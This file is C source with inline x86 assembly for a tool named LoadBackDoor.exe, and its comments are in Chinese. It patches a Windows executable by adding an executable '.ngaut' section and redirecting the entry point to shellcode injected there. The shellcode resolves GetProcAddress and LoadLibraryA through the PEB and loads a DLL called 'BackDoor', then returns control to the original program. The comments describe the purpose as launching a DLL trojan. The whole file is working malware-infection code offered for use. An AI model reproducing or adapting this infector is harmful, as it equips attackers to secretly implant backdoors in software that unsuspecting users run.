
#include <windows.h>
#include <winnt.h>
#include <stdio.h>
#include <assert.h>


#define DEBUG				1
#define EXTRA_CODE_LENGTH	18
#define SECTION_SIZE		0x1000 	//增加的节的大小
#define SECTION_NAME		".ngaut"	//增加的节的名字
#define FILE_NAME_LENGTH	30	//文件名最大长度(包括路径)


//对齐边界
int Align(int size, int ALIGN_BASE)
{
	int ret;
	int result;
	assert( 0 != ALIGN_BASE ); 

	result = size % ALIGN_BASE;
	if (0 != result)	//余数不为零，也就是没有整除
	{
		ret = ((size / ALIGN_BASE) + 1) * ALIGN_BASE;
	}
	else
	{
		ret = size;
	}

	return ret;
}

void usage()
{
	printf("用法：\n");
	printf("\tLoadBackDoor.exe FileName\n");
	printf("例子：: \n");
	printf("\tLoadBackDoor.exe test.exe\n");
}



int main(int argc, char *argv[])
{
	IMAGE_DOS_HEADER DosHeader;
	IMAGE_NT_HEADERS NtHeader;
	IMAGE_SECTION_HEADER SectionHeader;
	IMAGE_SECTION_HEADER newSectionHeader;	//新增加的节的节头
	int numOfSections;
	FILE *pNewFile;
	int FILE_ALIGN_MENT;
	int SECTION_ALIGN_MENT;
	char srcFileName[FILE_NAME_LENGTH];
	char newFileName[FILE_NAME_LENGTH];
	int i;
	int extraLengthAfterAlign;
	unsigned int newEP;	//新入口点
	unsigned int oldEP;
	BYTE jmp;
	char *pExtra_data;
	int extra_data_real_length;



	if (NULL == argv[1])
	{
		puts("参数错误\n");
		usage();
		exit(0);
	}
	strcpy(srcFileName, argv[1]);   
	strcpy(newFileName, srcFileName);
	strcat(newFileName, ".exe");

	//复制一份
	if (!CopyFile(srcFileName, newFileName, FALSE))
	{
		puts("Copy file failed");
		exit(0);
	}
	//打开新文件，文件名为原来的文件名 + .exe
	pNewFile = fopen(newFileName, "rb+");	//打开方式"rb+"
	if (NULL == pNewFile)
	{
		puts("Open file failed");
		exit(0);
	}


	fseek(pNewFile, 0, SEEK_SET);
	//读取IMAGE_DOS_HEADER
	fread(&DosHeader, sizeof(IMAGE_DOS_HEADER), 1, pNewFile);
	if (DosHeader.e_magic != IMAGE_DOS_SIGNATURE)
	{
		puts("Not a valid PE file");
		exit(0);
	}

	//先定位到pe文件头，然后读取IMAGE_NT_HEADERS
	fseek(pNewFile, DosHeader.e_lfanew, SEEK_SET);
	fread(&NtHeader, sizeof(IMAGE_NT_HEADERS), 1, pNewFile);
	if (NtHeader.Signature != IMAGE_NT_SIGNATURE)
	{
		puts("Not a valid PE file");
		exit(0);
	}

	//到这里，该文件就算是被验明正身了--合法的PE文件
	numOfSections = NtHeader.FileHeader.NumberOfSections;
	FILE_ALIGN_MENT = NtHeader.OptionalHeader.FileAlignment;
	SECTION_ALIGN_MENT = NtHeader.OptionalHeader.SectionAlignment;


	//保存原来的入口备用
	oldEP = NtHeader.OptionalHeader.AddressOfEntryPoint;

	//定位到最后一个SectionHeader
	for (i = 0; i < numOfSections; i++)
	{
		fread(&SectionHeader, sizeof(IMAGE_SECTION_HEADER), 1, pNewFile);

	}


	//增加一个新节前的准备工作
	extraLengthAfterAlign = Align(EXTRA_CODE_LENGTH, FILE_ALIGN_MENT);
	NtHeader.FileHeader.NumberOfSections++;	//节的总数加一
	//先清零
	memset(&newSectionHeader, 0, sizeof(IMAGE_SECTION_HEADER));
	//修正部分数据
	strncpy(newSectionHeader.Name, SECTION_NAME, strlen(SECTION_NAME));	//修正节名
	
//////修正VirtualAddress和VirtualSize通过对齐SECTION_ALIGN_MENT
	//修正VirtualAddress
	newSectionHeader.VirtualAddress = Align(SectionHeader.VirtualAddress + SectionHeader.Misc.VirtualSize,
		SECTION_ALIGN_MENT);
	//修正VirtualSize
	newSectionHeader.Misc.VirtualSize = Align(extraLengthAfterAlign, SECTION_ALIGN_MENT);

	//修正PointerToRawData
	newSectionHeader.PointerToRawData = Align
		(
		SectionHeader.PointerToRawData + SectionHeader.SizeOfRawData,
		FILE_ALIGN_MENT
		); 
	//修正SizeOfRawData
	newSectionHeader.SizeOfRawData = Align(SECTION_SIZE, FILE_ALIGN_MENT);

	//修改新节的属性
	newSectionHeader.Characteristics = 0xE0000020; //可读可些可执行
	//修正NtHeader

	NtHeader.OptionalHeader.SizeOfCode = Align(NtHeader.OptionalHeader.SizeOfCode + SECTION_SIZE, FILE_ALIGN_MENT);	//修正SizeOfCode
	NtHeader.OptionalHeader.SizeOfImage = NtHeader.OptionalHeader.SizeOfImage
				+ Align(SECTION_SIZE, SECTION_ALIGN_MENT); //修正SizeOfImage

	//Set zero the Bound Import Directory header
	NtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
	NtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;



	fseek(pNewFile, 0, SEEK_END);
	newEP = newSectionHeader.VirtualAddress;
	
	NtHeader.OptionalHeader.AddressOfEntryPoint = newEP;
	//定位节表尾部
	fseek(
		pNewFile, 
		DosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS) 
		+ numOfSections * sizeof(IMAGE_SECTION_HEADER),
		SEEK_SET
		);

	//写入修正后的节头
	fwrite(&newSectionHeader, sizeof(IMAGE_SECTION_HEADER), 1, pNewFile);


	//写入修正后的PE文件头(NT头)
	fseek(pNewFile, DosHeader.e_lfanew, SEEK_SET);
	
	fwrite(&NtHeader, sizeof(IMAGE_NT_HEADERS), 1, pNewFile);

	//定位到文件尾部
	fseek(pNewFile, 0, SEEK_END);

	//写入新节，这里先写入0
	for (i=0; i<Align(SECTION_SIZE, FILE_ALIGN_MENT); i++)
	{
		fputc(0, pNewFile);
	}

	//定位到新节的开头
	fseek(pNewFile, newSectionHeader.PointerToRawData, SEEK_SET);


	goto GetExtraData;


extra_data_start:
	_asm pushad
	//获取kernel32.dll的基址
	_asm 	mov eax, fs:0x30	 ;PEB的地址
	_asm 	mov eax, [eax + 0x0c]
	_asm 	mov esi, [eax + 0x1c]
	_asm 	lodsd
	_asm 	mov eax, [eax + 0x08] ;eax就是kernel32.dll的基址
	_asm 	mov edi, eax	//同时保存kernel32.dll的基址到edi
		
		//通过搜索 kernel32.dll的导出表查找GetProcAddress函数的地址
	_asm 	mov ebp, eax
	_asm 	mov eax, [ebp + 3ch]
	_asm 	mov edx, [ebp + eax + 78h]
	_asm 	add edx, ebp
	_asm 	mov ecx, [edx + 18h]
	_asm 	mov ebx, [edx + 20h]
	_asm 	add ebx, ebp
		
search:
	_asm	dec ecx
	_asm 	mov esi, [ebx + ecx * 4]
		
	_asm 	add esi, ebp
	_asm 	mov eax, 0x50746547
	_asm 	cmp [esi], eax		//比较"PteG"
	_asm 	jne search
	_asm 	mov eax, 0x41636f72
	_asm 	cmp [esi + 4], eax
	_asm 	jne search
	_asm 	mov ebx, [edx + 24h]
	_asm 	add ebx, ebp
	_asm 	mov cx, [ebx + ecx * 2]
	_asm 	mov ebx, [edx + 1ch]
	_asm 	add ebx, ebp
	_asm 	mov eax, [ebx + ecx * 4]
	_asm 	add eax, ebp		//eax保存的就是GetProcAddress的地址
		
		//为局部变量分配空间
	_asm 	push ebp
	_asm 	sub esp, 50h
	_asm 	mov ebp, esp
		
		//查找LoadLibrary的地址  LoadLibraryA
	_asm 	mov [ebp + 40h], eax	//把GetProcAddress的地址保存到ebp + 40中
	
		//开始查找LoadLibrary的地址, 先构造"LoadLibrary \0"
	_asm 	push 0x0	//即'\0'
	_asm 	push DWORD PTR 0x41797261
	_asm 	push DWORD PTR 0x7262694c
	_asm 	push DWORD PTR 0x64616f4c
	_asm 	push esp	//压入"LoadLibrary\0"的地址
	_asm 	push edi	//edi:kernel32的基址
	_asm 	call [ebp + 40h]	//返回值(即LoadLibrary的地址)保存在eax中
	_asm 	mov [ebp + 44h], eax	//保存LoadLibrary的地址到ebp + 44h
	_asm 	push 0x0
	_asm 	push DWORD PTR 0x726f6f44	//"Door"
	_asm 	push DWORD PTR 0x6b636142	//"Back"
	_asm 	push esp					//字符串"BackDoor"的地址，1234 5678
	_asm 	call [ebp + 44h]	//或者call eax
	_asm	mov esp, ebp
	_asm	add esp, 0x50
	_asm	popad
extra_data_end:
	

GetExtraData:
	_asm pushad;
	_asm lea eax, extra_data_start;
	_asm mov pExtra_data, eax;
	_asm lea edx, extra_data_end;
	_asm sub edx, eax;
	_asm mov extra_data_real_length, edx;
	_asm popad;
				


	//写入附加数据(用于启动DLL木马)
	for (i = 0; i < extra_data_real_length; i++)
	{
		fputc(pExtra_data[i], pNewFile);
	}


	oldEP = oldEP - (newEP + extra_data_real_length) - 5;

	jmp = 0xE9;
	fwrite(&jmp, sizeof(jmp), 1, pNewFile);
	fwrite(&oldEP, sizeof(oldEP), 1, pNewFile);

	fclose(pNewFile); 
	
	return 0;
}